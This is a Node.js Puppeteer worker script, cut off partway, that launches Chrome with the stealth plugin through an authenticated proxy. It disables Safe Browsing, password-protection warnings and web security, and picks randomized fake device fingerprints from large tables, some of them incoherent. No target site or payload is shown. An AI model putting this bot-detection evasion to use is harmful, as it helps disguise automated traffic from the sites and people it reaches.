const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const userPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
const { parentPort, workerData } = require('worker_threads');
const path = require('path');
const fs = require('fs-extra');
const os = require('os');
const { execSync } = require('child_process');
const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
const { v4: uuidv4 } = require('uuid'); // UUID para directorios únicos

puppeteer.use(StealthPlugin());

puppeteer.use(userPreferencesPlugin({
    userPrefs: {
        profile: {
            password_manager_enabled: false,
        },
        credentials_enable_service: false,
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));

let isPaused = false;
let browser;
let cachedFingerprint = null;
let userDataDir;
let page;
// Función para manejar la pausa
function checkPaused() {
    return new Promise((resolve) => {
        const interval = setInterval(() => {
            if (!isPaused) {
                clearInterval(interval);
                resolve();
            }
        }, 100); // Verifica cada 100ms si el worker sigue en pausa
    });
}

// Manejar mensajes desde el proceso principal
parentPort.on('message', async (message) => {
    if (message === 'pause') {
        isPaused = true;
        parentPort.postMessage('Worker pausado');
    } else if (message === 'resume') {
        isPaused = false;
        parentPort.postMessage('Worker reanudado');
    } else if (message === 'stop') {
        parentPort.postMessage('deteniendo Worker ');

        killChromeProcesses();

        await cleanUp(browser, page, userDataDir);
     
        
        parentPort.postMessage('Worker detenido');
        process.exit(0); // Finalizar el proceso del worker
    }
});




async function createBrowserInstance(proxy) {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-blink-features=AutomationControlled',
        '--disable-extensions',
        '--disable-dev-shm-usage',
        '--disable-infobars',
        '--window-size=1280,800',
        '--disable-accelerated-2d-canvas',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-notifications',
        '--disable-popup-blocking',
        '--disable-features=PasswordProtectionWarningTrigger',
        '--disable-features=SafeBrowsingEnhancedProtection',
        '--disable-prompt-on-repost',
        '--disable-features=PasswordCheck',
        '--disable-cache'
    ];

    let proxyAuth;
    let proxyUrl;
    
    if (proxy) {
        if (proxy.includes('@')) {
            const [hostPort, userPass] = proxy.split('@');
            const [host, port] = hostPort.split(':');
            const [username, password] = userPass.split(':');

            proxyUrl = `http://${host}:${port}`;
            proxyAuth = { username, password };
        } else if (proxy.split(':').length === 4) {
            const [host, port, username, password] = proxy.split(':');

            proxyUrl = `http://${host}:${port}`;
            proxyAuth = { username, password };
        } else {
            console.error("Formato de proxy inválido. Se espera: host:port o host:port:username:password o host:port@username:password");
            return;
        }

        args.push(`--proxy-server=${proxyUrl}`);
    }

    try {
        userDataDir = path.join(os.tmpdir(), `puppeteer_tmp_${uuidv4()}`); // Directorio temporal único
        await resetFingerprintCache();
        const userAgent =  getUserAgent();
        const browser = await puppeteer.launch({
            headless: workerData.useHeadless,
            args: args,
            userDataDir, // Usa el directorio temporal único
            executablePath: chromePath,
            protocolTimeout: 50000 
        });

        page = await browser.newPage();
         page.setUserAgent(userAgent);

        if (proxyAuth) {
            await page.authenticate(proxyAuth);
        }

        await configureFingerprint(page);

        return { browser, page, userDataDir };

    } catch (error) {
        console.error("Error al crear la instancia del navegador:", error.message);
        throw error;
    }
}



function getRandomFingerprint() {
    const hardwareConcurrencyOptions = [
        1, 2, 4, 6, 8, 10, 12, 16, 20, 24, 28, 32, 36, 40, 48, 56, 64, 72, 80, 96, 128
    ];
    
    const deviceMemoryOptions = [
        1, 2, 4, 6, 8, 12, 16, 24, 32, 48, 64, 96, 128, 192, 256, 512
    ];
    const platformOptions = ['Win32', 'MacIntel', 'Linux x86_64', 'Linux armv7l'];
    const languageOptions = [
        ['en-US', 'en'], ['en-GB', 'en'], ['en-CA', 'en'], ['en-AU', 'en'], ['en-NZ', 'en'], 
        ['fr-FR', 'fr'], ['fr-CA', 'fr'], ['fr-BE', 'fr'], ['fr-CH', 'fr'], 
        ['es-ES', 'es'], ['es-MX', 'es'], ['es-AR', 'es'], ['es-CO', 'es'], ['es-CL', 'es'], 
        ['de-DE', 'de'], ['de-AT', 'de'], ['de-CH', 'de'], 
        ['zh-CN', 'zh'], ['zh-TW', 'zh'], ['zh-HK', 'zh'], 
        ['ja-JP', 'ja'], 
        ['ko-KR', 'ko'], 
        ['it-IT', 'it'], ['it-CH', 'it'], 
        ['pt-PT', 'pt'], ['pt-BR', 'pt'], 
        ['ru-RU', 'ru'], ['ru-UA', 'ru'], 
        ['nl-NL', 'nl'], ['nl-BE', 'nl'], 
        ['sv-SE', 'sv'], ['sv-FI', 'sv'], 
        ['no-NO', 'no'], 
        ['da-DK', 'da'], 
        ['fi-FI', 'fi'], 
        ['pl-PL', 'pl'], 
        ['cs-CZ', 'cs'], 
        ['sk-SK', 'sk'], 
        ['hu-HU', 'hu'], 
        ['tr-TR', 'tr'], 
        ['el-GR', 'el'], 
        ['he-IL', 'he'], 
        ['ar-SA', 'ar'], ['ar-AE', 'ar'], ['ar-EG', 'ar'], 
        ['hi-IN', 'hi'], 
        ['bn-BD', 'bn'], 
        ['ur-PK', 'ur'], 
        ['fa-IR', 'fa'], 
        ['th-TH', 'th'], 
        ['vi-VN', 'vi'], 
        ['ms-MY', 'ms'], 
        ['id-ID', 'id'], 
        ['tl-PH', 'tl'], 
        ['uk-UA', 'uk'], 
        ['ro-RO', 'ro'], 
        ['bg-BG', 'bg'], 
        ['sr-RS', 'sr'], 
        ['hr-HR', 'hr'], 
        ['lt-LT', 'lt'], 
        ['lv-LV', 'lv'], 
        ['et-EE', 'et'], 
        ['sl-SI', 'sl'], 
        ['mt-MT', 'mt'], 
        ['ga-IE', 'ga'], 
        ['cy-GB', 'cy'], 
        ['is-IS', 'is'], 
        ['sq-AL', 'sq'], 
        ['mk-MK', 'mk'], 
        ['bs-BA', 'bs'], 
        ['az-AZ', 'az'], 
        ['ka-GE', 'ka'], 
        ['hy-AM', 'hy'], 
        ['kk-KZ', 'kk'], 
        ['uz-UZ', 'uz'], 
        ['mn-MN', 'mn'], 
        ['my-MM', 'my'], 
        ['km-KH', 'km'], 
        ['lo-LA', 'lo'], 
        ['si-LK', 'si'], 
        ['ne-NP', 'ne'], 
        ['pa-IN', 'pa'], 
        ['gu-IN', 'gu'], 
        ['ta-IN', 'ta'], 
        ['te-IN', 'te'], 
        ['kn-IN', 'kn'], 
        ['ml-IN', 'ml'], 
        ['mr-IN', 'mr'], 
        ['or-IN', 'or'], 
        ['as-IN', 'as'], 
        ['sd-IN', 'sd'], 
        ['gl-ES', 'gl'], 
        ['eu-ES', 'eu'], 
        ['ca-ES', 'ca'], 
        ['be-BY', 'be'], 
        ['yo-NG', 'yo'], 
        ['zu-ZA', 'zu'], 
        ['xh-ZA', 'xh'], 
        ['st-ZA', 'st'], 
        ['tn-ZA', 'tn'], 
        ['sw-KE', 'sw'], 
        ['ha-NG', 'ha'], 
        ['ig-NG', 'ig']
    ];
    const vendorOptions = {
'Win32': 'Google Inc.',
    'Win64': 'Microsoft Corporation',
    'Windows NT 10.0': 'Google Inc.',
    'Windows NT 6.1': 'Mozilla Foundation',
    'Windows NT 6.2': 'NVIDIA Corporation',
    'Windows NT 6.3': 'AMD',
    'Windows NT 5.1': 'Intel Corporation',
    'Windows NT 5.0': 'Oracle Corporation',
    'Windows NT 4.0': 'IBM Corporation',
    'Windows ME': 'Microsoft Corporation',
    'Windows 98': 'Sun Microsystems, Inc.',
    'Windows 95': 'Compaq Computer Corporation',
    'Windows 3.1': 'Texas Instruments',
    'MacIntel': 'Apple Inc.',
    'MacPPC': 'IBM Corporation',
    'Mac68K': 'Motorola, Inc.',
    'Mac OS X 10_15_7': 'Google Inc.',
    'Mac OS X 11_0_1': 'Apple Inc.',
    'Mac OS X 12_1': 'Apple Inc.',
    'Mac OS X 10_14_6': 'NVIDIA Corporation',
    'Mac OS X 10_13_6': 'AMD',
    'Mac OS X 10_12_6': 'Intel Corporation',
    'Mac OS X 10_11_6': 'Oracle Corporation',
    'Mac OS X 10_10_5': 'Mozilla Foundation',
    'Linux x86_64': 'Mozilla Foundation',
    'Linux i686': 'Google Inc.',
    'Linux armv7l': 'Google Inc.',
    'Linux aarch64': 'ARM Holdings',
    'Linux ppc64le': 'IBM Corporation',
    'Linux s390x': 'Red Hat, Inc.',
    'Linux mips': 'Imagination Technologies',
    'Linux mips64': 'Loongson Technology',
    'Linux riscv64': 'SiFive, Inc.',
    'Linux x86': 'Intel Corporation',
    'Linux sparc': 'Oracle Corporation',
    'Linux alpha': 'Digital Equipment Corporation',
    'Linux ia64': 'Hewlett-Packard Company',
    'Linux hppa': 'Hewlett-Packard Company',
    'Linux ppc': 'IBM Corporation',
    'Linux m68k': 'Motorola, Inc.',
    'FreeBSD x86_64': 'Mozilla Foundation',
    'FreeBSD i386': 'Google Inc.',
    'NetBSD x86_64': 'NetBSD Foundation',
    'NetBSD i386': 'Google Inc.',
    'OpenBSD x86_64': 'OpenBSD Project',
    'OpenBSD i386': 'OpenBSD Project',
    'DragonFly x86_64': 'DragonFly BSD',
    'DragonFly i386': 'DragonFly BSD',
    'Darwin x86_64': 'Apple Inc.',
    'Darwin i386': 'Apple Inc.',
    'Android': 'Google Inc.',
    'Android 10': 'Google Inc.',
    'Android 11': 'Google Inc.',
    'Android 12': 'Google Inc.',
    'Android 13': 'Google Inc.',
    'iPhone': 'Apple Inc.',
    'iPad': 'Apple Inc.',
    'iPod': 'Apple Inc.',
    'iOS 14_4': 'Apple Inc.',
    'iOS 15_2': 'Apple Inc.',
    'iOS 16_0': 'Apple Inc.',
    'Chrome OS': 'Google Inc.',
    'Chromium OS': 'Google Inc.',
    'Ubuntu 20.04': 'Canonical Ltd.',
    'Ubuntu 18.04': 'Canonical Ltd.',
    'Fedora 34': 'Red Hat, Inc.',
    'Fedora 35': 'Red Hat, Inc.',
    'Debian 10': 'Debian Project',
    'Debian 11': 'Debian Project',
    'Raspbian 10': 'Raspberry Pi Foundation',
    'Raspbian 11': 'Raspberry Pi Foundation',
    'Gentoo': 'Gentoo Foundation',
    'Arch Linux': 'Arch Linux',
    'Manjaro': 'Manjaro GmbH & Co. KG',
    'Solaris': 'Oracle Corporation',
    'SunOS': 'Sun Microsystems, Inc.',
    'AIX': 'IBM Corporation',
    'HP-UX': 'Hewlett-Packard Company',
    'IRIX': 'Silicon Graphics, Inc.',
    'Haiku': 'Haiku, Inc.',
    'ReactOS': 'ReactOS Foundation',
    'QNX': 'BlackBerry Limited',
    'Plan 9': 'Bell Labs',
    'MorphOS': 'MorphOS Development Team',
    'AmigaOS': 'Commodore International',
    'AROS': 'AROS Development Team',
    'Symbian': 'Symbian Ltd.',
    'BlackBerry': 'BlackBerry Limited',
    'Windows Phone 8.1': 'Microsoft Corporation',
    'Windows Phone 10': 'Microsoft Corporation',
    'MeeGo': 'Nokia',
    'Tizen': 'Linux Foundation',
    'Firefox OS': 'Mozilla Foundation',
    'KaiOS': 'KaiOS Technologies',
    'Bada': 'Samsung Electronics',
    'webOS': 'LG Electronics',
    'Palm OS': 'Palm, Inc.',
    'BeOS': 'Be Inc.',
    'OS/2': 'IBM Corporation',
    'MS-DOS': 'Microsoft Corporation',
    'Windows CE': 'Microsoft Corporation',
    'Windows Mobile 6.5': 'Microsoft Corporation',
    'Nokia Series 40': 'Nokia',
    'Nokia Asha': 'Nokia',
    'Tizen 4.0': 'Samsung Electronics',
    'Tizen 5.0': 'Samsung Electronics'
    };
    const webGLVendorOptions = {
    'Win32': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation', 'S3 Graphics', 'Matrox Electronic Systems'],
    'Win64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation', 'S3 Graphics', 'Matrox Electronic Systems'],
    'Windows NT 10.0': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation', 'Qualcomm'],
    'Windows NT 6.1': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation'],
    'Windows NT 6.2': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation'],
    'Windows NT 6.3': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation'],
    'Windows NT 5.1': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation'],
    'Windows NT 5.0': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Microsoft Corporation'],
    'MacIntel': ['Apple Inc.', 'AMD', 'Intel Inc.', 'NVIDIA Corporation'],
    'MacPPC': ['Apple Inc.', 'IBM Corporation', 'NVIDIA Corporation', 'ATI Technologies'],
    'Mac68K': ['Apple Inc.', 'Motorola, Inc.', 'NVIDIA Corporation', 'AMD'],
    'Mac OS X 10_15_7': ['Apple Inc.', 'Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'Mac OS X 11_0_1': ['Apple Inc.', 'Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'Mac OS X 12_1': ['Apple Inc.', 'Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'Linux x86_64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM Limited', 'Qualcomm'],
    'Linux i686': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM Limited'],
    'Linux armv7l': ['Qualcomm', 'ARM', 'Imagination Technologies', 'Vivante Corporation'],
    'Linux aarch64': ['ARM Limited', 'Qualcomm', 'Imagination Technologies', 'NVIDIA Corporation'],
    'Linux ppc64le': ['IBM Corporation', 'NVIDIA Corporation', 'AMD'],
    'Linux s390x': ['IBM Corporation', 'NVIDIA Corporation', 'AMD'],
    'Linux mips': ['Imagination Technologies', 'NVIDIA Corporation', 'AMD'],
    'Linux mips64': ['Imagination Technologies', 'NVIDIA Corporation', 'AMD'],
    'Linux riscv64': ['SiFive, Inc.', 'NVIDIA Corporation', 'AMD'],
    'Linux x86': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM Limited'],
    'Linux sparc': ['Oracle Corporation', 'NVIDIA Corporation', 'AMD'],
    'Linux alpha': ['Digital Equipment Corporation', 'NVIDIA Corporation', 'AMD'],
    'Linux ia64': ['Hewlett-Packard Company', 'NVIDIA Corporation', 'AMD'],
    'Linux hppa': ['Hewlett-Packard Company', 'NVIDIA Corporation', 'AMD'],
    'Linux ppc': ['IBM Corporation', 'NVIDIA Corporation', 'AMD'],
    'Linux m68k': ['Motorola, Inc.', 'NVIDIA Corporation', 'AMD'],
    'FreeBSD x86_64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'FreeBSD i386': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'NetBSD x86_64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'NetBSD i386': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'OpenBSD x86_64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'OpenBSD i386': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'DragonFly x86_64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'DragonFly i386': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'Darwin x86_64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'Darwin i386': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
    'Android': ['Qualcomm', 'ARM', 'Imagination Technologies', 'Vivante Corporation', 'NVIDIA Corporation'],
    'Android 10': ['Qualcomm', 'ARM', 'Imagination Technologies', 'Vivante Corporation', 'NVIDIA Corporation'],
    'Android 11': ['Qualcomm', 'ARM', 'Imagination Technologies', 'Vivante Corporation', 'NVIDIA Corporation'],
    'Android 12': ['Qualcomm', 'ARM', 'Imagination Technologies', 'Vivante Corporation', 'NVIDIA Corporation'],
    'Android 13': ['Qualcomm', 'ARM', 'Imagination Technologies', 'Vivante Corporation', 'NVIDIA Corporation'],
    'iPhone': ['Apple Inc.', 'Imagination Technologies', 'ARM'],
    'iPad': ['Apple Inc.', 'Imagination Technologies', 'ARM'],
    'iPod': ['Apple Inc.', 'Imagination Technologies', 'ARM'],
    'iOS 14_4': ['Apple Inc.', 'Imagination Technologies', 'ARM'],
    'iOS 15_2': ['Apple Inc.', 'Imagination Technologies', 'ARM'],
    'iOS 16_0': ['Apple Inc.', 'Imagination Technologies', 'ARM'],
    'Chrome OS': ['Google Inc.', 'Intel Inc.', 'ARM'],
    'Chromium OS': ['Google Inc.', 'Intel Inc.', 'ARM'],
    'Ubuntu 20.04': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Ubuntu 18.04': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Fedora 34': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Fedora 35': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Debian 10': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Debian 11': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Raspbian 10': ['Broadcom', 'ARM'],
    'Raspbian 11': ['Broadcom', 'ARM'],
    'Gentoo': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Arch Linux': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Manjaro': ['Intel Inc.', 'NVIDIA Corporation', 'AMD', 'ARM'],
    'Solaris': ['Oracle Corporation', 'NVIDIA Corporation', 'AMD'],
    'SunOS': ['Oracle Corporation', 'NVIDIA Corporation', 'AMD'],
    'AIX': ['IBM Corporation', 'NVIDIA Corporation', 'AMD'],
    'HP-UX': ['Hewlett-Packard Company', 'NVIDIA Corporation', 'AMD'],
    'IRIX': ['Silicon Graphics, Inc.', 'NVIDIA Corporation', 'AMD'],
    'Haiku': ['Haiku, Inc.', 'NVIDIA Corporation', 'AMD'],
    'ReactOS': ['ReactOS Foundation', 'NVIDIA Corporation', 'AMD'],
    'QNX': ['BlackBerry Limited', 'NVIDIA Corporation', 'AMD'],
    'Plan 9': ['Bell Labs', 'NVIDIA Corporation', 'AMD'],
    'MorphOS': ['MorphOS Development Team', 'NVIDIA Corporation', 'AMD'],
    'AmigaOS': ['Commodore International', 'NVIDIA Corporation', 'AMD'],
    'AROS': ['AROS Development Team', 'NVIDIA Corporation', 'AMD'],
    'Symbian': ['Symbian Ltd.', 'Qualcomm', 'ARM'],
    'BlackBerry': ['BlackBerry Limited', 'Qualcomm', 'ARM'],
    'Windows Phone 8.1': ['Microsoft Corporation', 'Qualcomm', 'ARM'],
    'Windows Phone 10': ['Microsoft Corporation', 'Qualcomm', 'ARM'],
    'MeeGo': ['Nokia', 'Intel Inc.', 'ARM'],
    'Tizen': ['Linux Foundation', 'Intel Inc.', 'ARM'],
    'Firefox OS': ['Mozilla Foundation', 'Qualcomm', 'ARM'],
    'KaiOS': ['KaiOS Technologies', 'Qualcomm', 'ARM'],
    'Bada': ['Samsung Electronics', 'Qualcomm', 'ARM'],
    'webOS': ['LG Electronics', 'Qualcomm', 'ARM'],
    'Palm OS': ['Palm, Inc.', 'Qualcomm', 'ARM'],
    'BeOS': ['Be Inc.', 'Intel Inc.', 'AMD'],
    'OS/2': ['IBM Corporation', 'Intel Inc.', 'AMD'],
    'MS-DOS': ['Microsoft Corporation', 'Intel Inc.', 'AMD'],
    'Windows CE': ['Microsoft Corporation', 'Intel Inc.', 'ARM'],
    'Windows Mobile 6.5': ['Microsoft Corporation', 'Intel Inc.', 'ARM'],
    'Nokia Series 40': ['Nokia', 'ARM'],
    'Nokia Asha': ['Nokia', 'ARM'],
    'Tizen 4.0': ['Samsung Electronics', 'Intel Inc.', 'ARM'],
    'Tizen 5.0': ['Samsung Electronics', 'Intel Inc.', 'ARM']
    };
    const webGLRendererOptions = {
        'Win32': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'Win64': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'GeForce GTX 1080 Ti', 'Radeon Pro WX 7100', 'Intel(R) UHD Graphics 620',
            'GeForce RTX 3070', 'Radeon RX 6800 XT', 'GeForce RTX 2060'
        ],
        'Windows NT 10.0': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'GeForce RTX 3080', 'Intel(R) UHD Graphics 620', 'Radeon RX 5500 XT',
            'GeForce GTX 970', 'Intel(R) HD Graphics 620', 'GeForce GTX 1660 Super'
        ],
        'Windows NT 6.1': [
            'Intel(R) Iris(TM) Graphics 540', 'GeForce GTX 1060', 'Radeon R9 390X', 
            'Intel(R) HD Graphics 630', 'GeForce RTX 2070', 'Radeon RX 590',
            'GeForce GTX 980 Ti', 'Intel(R) HD Graphics 520', 'GeForce GTX 1650'
        ],
        'MacIntel': [
            'Apple M1', 'Radeon RX 580', 'Intel(R) Iris(TM) Plus Graphics 650',
            'Radeon Pro 560X', 'Apple M1 Pro', 'Radeon Pro 580X',
            'Intel(R) HD Graphics 630', 'Radeon Pro 570X', 'Apple M1 Max'
        ],
        'MacPPC': [
            'Radeon 9200', 'GeForce FX 5200 Ultra', 'Radeon 9700 Pro',
            'GeForce4 MX', 'Radeon 9800 Pro', 'GeForce 6800 Ultra',
            'Radeon X800 XT', 'GeForce FX 5200', 'Radeon X1600'
        ],
        'Mac68K': [
            'ATI Mach64', 'NVIDIA RIVA 128', '3Dfx Voodoo3',
            'Matrox Millennium', 'Radeon 7500', 'GeForce2 MX'
        ],
        'Linux x86_64': [
            'GeForce GTX 1050', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce RTX 2080 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 630',
            'GeForce GTX 1660 Super', 'Radeon RX 5500 XT', 'GeForce GTX 1080'
        ],
        'Linux i686': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Linux armv7l': [
            'Mali-G76', 'Adreno (TM) 540', 'Vivante GC7000',
            'Broadcom VideoCore IV', 'Mali-T880', 'PowerVR SGX544MP',
            'Adreno 530', 'Mali-G52', 'Vivante GC880'
        ],
        'Linux aarch64': [
            'Mali-G78', 'Adreno (TM) 650', 'NVIDIA Tegra X1',
            'Vivante GC7000', 'Mali-T860', 'Adreno 540',
            'Mali-G71', 'Adreno 630', 'NVIDIA Tegra K1'
        ],
        'FreeBSD x86_64': [
            'GeForce GTX 1060', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce GTX 960', 'Radeon R9 380', 'Intel(R) HD Graphics 620',
            'GeForce GTX 970', 'Radeon RX 570', 'GeForce GTX 750 Ti'
        ],
        'FreeBSD i386': [
            'GeForce GTX 960', 'Radeon R9 380', 'Intel(R) Iris(TM) Plus Graphics 640',
            'GeForce GTX 750 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 970', 'Radeon RX 580', 'Intel(R) HD Graphics 520'
        ],
        'NetBSD x86_64': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 630',
            'GeForce GTX 1080', 'Radeon RX 580', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 750 Ti', 'Radeon R9 390X', 'GeForce GTX 1060'
        ],
        'NetBSD i386': [
            'GeForce GTX 750 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 960', 'Radeon RX 580', 'Intel(R) HD Graphics 520',
            'GeForce GTX 970', 'Radeon R9 380', 'Intel(R) Iris(TM) Plus Graphics 640'
        ],
        'OpenBSD x86_64': [
            'GeForce GTX 960', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce GTX 750 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 970', 'Radeon R9 380', 'Intel(R) HD Graphics 620'
        ],
        'OpenBSD i386': [
            'GeForce GTX 750 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 960', 'Radeon RX 580', 'Intel(R) Iris(TM) Plus Graphics 640',
            'GeForce GTX 970', 'Radeon R9 380', 'Intel(R) HD Graphics 520'
        ],
        'DragonFly x86_64': [
            'GeForce GTX 970', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce GTX 1060', 'Radeon RX 570', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 960', 'Radeon R9 380', 'GeForce GTX 750 Ti'
        ],
        'DragonFly i386': [
            'GeForce GTX 750 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 960', 'Radeon RX 580', 'Intel(R) Iris(TM) Plus Graphics 640',
            'GeForce GTX 970', 'Radeon R9 380', 'Intel(R) HD Graphics 520'
        ],
        'Darwin x86_64': [
            'GeForce GTX 1050', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce GTX 1080 Ti', 'Radeon Pro 570X', 'Intel(R) HD Graphics 630',
            'GeForce GTX 1060', 'Radeon RX 570', 'GeForce GTX 980'
        ],
        'Darwin i386': [
            'GeForce GTX 750 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 970', 'Radeon R9 380', 'Intel(R) HD Graphics 620',
            'GeForce GTX 1060', 'Radeon RX 580', 'Intel(R) Iris(TM) Plus Graphics 640'
        ],
        'Android': [
            'Adreno 630', 'Mali-G76 MP12', 'PowerVR GM9446',
            'Adreno 640', 'Mali-G72 MP18', 'PowerVR GE8320',
            'Adreno 530', 'Mali-G71 MP8', 'Vivante GC7000'
        ],
        'Android 10': [
            'Adreno 640', 'Mali-G76 MP12', 'PowerVR GM9446',
            'Adreno 630', 'Mali-G72 MP18', 'PowerVR GE8320',
            'Adreno 530', 'Mali-G71 MP8', 'Vivante GC7000'
        ],
        'Android 11': [
            'Adreno 650', 'Mali-G77 MP11', 'PowerVR GM9446',
            'Adreno 640', 'Mali-G76 MP12', 'PowerVR GE8320',
            'Adreno 530', 'Mali-G71 MP8', 'Vivante GC7000'
        ],
        'Android 12': [
            'Adreno 660', 'Mali-G78 MP24', 'PowerVR GM9446',
            'Adreno 650', 'Mali-G77 MP11', 'PowerVR GE8320',
            'Adreno 640', 'Mali-G72 MP18', 'Vivante GC7000'
        ],
        'Android 13': [
            'Adreno 730', 'Mali-G710 MP16', 'PowerVR GM9446',
            'Adreno 660', 'Mali-G78 MP24', 'PowerVR GE8320',
            'Adreno 650', 'Mali-G76 MP12', 'Vivante GC7000'
        ],
        'iPhone': [
            'Apple A12 Bionic', 'Apple A13 Bionic', 'Apple A14 Bionic',
            'Apple A11 Bionic', 'Apple A10 Fusion', 'Apple A9',
            'Apple A9X', 'Apple A8', 'Apple A7'
        ],
        'iPad': [
            'Apple A12X Bionic', 'Apple A12Z Bionic', 'Apple A10X Fusion',
            'Apple A9X', 'Apple A8X', 'Apple A7',
            'Apple A14 Bionic', 'Apple A13 Bionic', 'Apple A10 Fusion'
        ],
        'iPod': [
            'Apple A8', 'Apple A5', 'Apple A4',
            'Apple A6', 'Apple A5X', 'Apple A7'
        ],
        'iOS 14_4': [
            'Apple A13 Bionic', 'Apple A12 Bionic', 'Apple A11 Bionic',
            'Apple A10 Fusion', 'Apple A9', 'Apple A8',
            'Apple A14 Bionic', 'Apple A12Z Bionic', 'Apple A10X Fusion'
        ],
        'iOS 15_2': [
            'Apple A14 Bionic', 'Apple A13 Bionic', 'Apple A12 Bionic',
            'Apple A11 Bionic', 'Apple A10 Fusion', 'Apple A9',
            'Apple A12X Bionic', 'Apple A12Z Bionic', 'Apple A10X Fusion'
        ],
        'iOS 16_0': [
            'Apple A15 Bionic', 'Apple A14 Bionic', 'Apple A13 Bionic',
            'Apple A12 Bionic', 'Apple A11 Bionic', 'Apple A10 Fusion',
            'Apple A9', 'Apple A8', 'Apple A12Z Bionic'
        ],
        'Chrome OS': [
            'Intel(R) HD Graphics 620', 'GeForce GTX 1050', 'Intel(R) UHD Graphics 630',
            'Intel(R) Iris(TM) Plus Graphics 640', 'Intel(R) HD Graphics 520', 'GeForce GTX 1060',
            'Intel(R) Iris(TM) Xe Graphics', 'GeForce GTX 970', 'Radeon RX 580'
        ],
        'Chromium OS': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580',
            'Intel(R) UHD Graphics 630', 'GeForce GTX 1060', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce GTX 970', 'Intel(R) HD Graphics 520', 'Radeon RX 570'
        ],
        'Ubuntu 20.04': [
            'GeForce GTX 1050', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce RTX 2080 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 630',
            'GeForce GTX 1660 Super', 'Radeon RX 5500 XT', 'GeForce GTX 1080'
        ],
        'Ubuntu 18.04': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Fedora 34': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
